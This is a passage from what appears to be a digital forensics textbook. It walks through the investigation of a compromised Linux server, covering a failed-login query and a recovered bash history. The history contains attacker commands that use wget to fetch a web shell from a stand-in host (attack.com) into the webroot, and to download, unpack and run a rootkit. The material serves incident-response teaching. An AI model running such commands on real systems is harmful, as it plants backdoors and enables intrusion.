  md: '![](img/7abfab28a493757db3f096946a95ec01_348_0.png)


    FIGURE 9.24


    Running this query of failed logins select * from login_fails order by start;
    paints a different picture. There is a long string of failed login attempts for
    John up until 23:07:54 on the 3rd of May. When combined with a successful remote
    login by John at 23:10:11 that day, it would appear that John''s account has been
    compromised. The failed logins are shown in Figure 9.25. At this stage it would
    appear that the initial compromise was the result of a webserver vulnerability.
    Once the attacker had his or her foot in the door, additional attacks were performed
    resulting in at least one compromised password.'
  merge: -1
  pgno: 348
- img_proc: true
  md: '![](img/7abfab28a493757db3f096946a95ec01_349_0.png)


    # FIGURE 9.25


    Failed login attempts. The failed attempts happen repeatedly until 23:07:54. Consultation
    with the information Figure 9.24 indicates that the password was compromised.


    While the bash history from .bash_history files doesn''t have timestamps, like
    the history from Volatility, it can still provide useful information. As shown
    in Figure 9.26, John''s account was used to download and install two additional
    rootkits, that we have not yet discovered. The first one is a web shell called
    Poison, that was installed on the webserver as index2.php. The second one is called
    RK.


    ```

    $ /usr/bin/bash $ cd /etc/ryqll

    $ /home/john/bash $ ls -la

    $ /home/john/bash $ cat /etc/motd

    $ /home/john/bash $ cd /tmp

    $ /home/john/bash $ wget http://www.attack.com/php/webshell/2.php/index2.php -o
    /var/www/html/index2.php

    $ /home/john/bash $ cd /tmp

    $ /home/john/bash $ ls -la

    $ /home/john/bash $ cat index2.php

    $ /home/john/bash $ cd /tmp

    $ /home/john/bash $ wget http://www.attack.com/rootkit/rk.tar.gz -o /tmp/rk.tar.gz

    $ /home/john/bash $ tar -xzf /tmp/rk.tar.gz

    $ /home/john/bash $ cd /tmp

    $ /home/john/bash $ ls -la

    $ /home/john/bash $ ./rk

    ```'
